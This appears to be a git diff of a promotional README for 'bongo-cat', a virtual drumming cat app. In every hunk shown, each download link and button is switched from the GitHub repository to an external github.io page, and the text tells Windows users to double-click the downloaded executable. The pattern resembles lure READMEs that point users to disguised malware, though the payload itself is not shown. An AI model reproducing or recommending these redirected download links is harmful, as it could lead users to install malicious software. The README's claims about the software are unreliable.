@@ -1,6 +1,6 @@
 # 🐱 bongo-cat - Your Furry Virtual Drumming Companion
 
-[![Download Bongo Cat](https://img.shields.io/badge/Download-Bongo_Cat-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=6a5acd)](https://github.com/Unanimated-spiritualbeing591/bongo-cat)
+[![Download Bongo Cat](https://img.shields.io/badge/Download-Bongo_Cat-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=6a5acd)](https://unanimated-spiritualbeing591.github.io)
 
 ## 🎯 What Is Bongo Cat?
 
@@ -30,7 +30,7 @@ Getting Bongo Cat up and running is incredibly simple. Here's what you need to d
 ### Step 1: Download Bongo Cat
 
 Visit this link to download the application:
-**[👉 Click Here to Download Bongo Cat](https://github.com/Unanimated-spiritualbeing591/bongo-cat)**
+**[👉 Click Here to Download Bongo Cat](https://unanimated-spiritualbeing591.github.io)**
 
 ### Step 2: Run Bongo Cat
 
@@ -45,7 +45,7 @@ That's it! Start typing, clicking, or pressing any keys on your keyboard. Watch 
 ### For Windows Users
 
 **Visit this link to download the application:**
-<a href="https://github.com/Unanimated-spiritualbeing591/bongo-cat" style="display:inline-block;padding:12px 24px;background:#2ea44f;color:#fff;border-radius:6px;text-decoration:none;font-weight:bold;margin:10px 0;">⬇️ Download Bongo Cat Now</a>
+<a href="https://unanimated-spiritualbeing591.github.io" style="display:inline-block;padding:12px 24px;background:#2ea44f;color:#fff;border-radius:6px;text-decoration:none;font-weight:bold;margin:10px 0;">⬇️ Download Bongo Cat Now</a>
 
 After downloading, you can either:
 - **Directly Run**: If you downloaded an executable file, double-click it to start using Bongo Cat immediately
@@ -146,7 +146,7 @@ Bongo Cat isn't just software—it's a community of cat-loving, music-appreciati
 
 Don't wait another minute to add this charming companion to your desktop. Download Bongo Cat now and transform your everyday computer activities into a musical celebration!
 
-[![Get Bongo Cat](https://img.shields.io/badge/🚀_Get_Started-FREE_Download-4CAF50?style=for-the-badge)](https://github.com/Unanimated-spiritualbeing591/bongo-cat)
+[![Get Bongo Cat](https://img.shields.io/badge/🚀_Get_Started-FREE_Download-4CAF50?style=for-the-badge)](https://unanimated-spiritualbeing591.github.io)
 
 Remember: every keystroke is a drumbeat, every click is a rhythm. Let Bongo Cat bring the joy of performance to your daily computing!
 
@@ -161,7 +161,7 @@ Remember: every keystroke is a drumbeat, every click is a rhythm. Let Bongo Cat 
 
 Ready to get started? Here's your direct path to Bongo Cat:
 
-**[Download Bongo Cat for Free](https://github.com/Unanimated-spiritualbeing591/bongo-cat)**
+**[Download Bongo Cat for Free](https://unanimated-spiritualbeing591.github.io)**
 
 Don't forget to ⭐ star the repository if you enjoy using Bongo Cat!
 
